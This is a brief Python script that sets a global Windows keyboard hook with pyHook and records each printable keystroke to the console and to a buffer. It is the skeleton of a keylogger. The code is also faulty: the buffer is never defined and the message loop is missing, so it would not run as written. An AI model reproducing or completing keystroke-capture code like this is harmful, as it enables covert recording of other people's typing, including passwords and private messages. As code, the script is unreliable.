#!/usr/bin/python
# -*- coding: utf-8 -*-

import pyHook
def OnKeyboardEvent(event):

    if event.Ascii in range(32, 127):
        print(chr(event.Ascii))
        buffer += chr(event.Ascii)

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
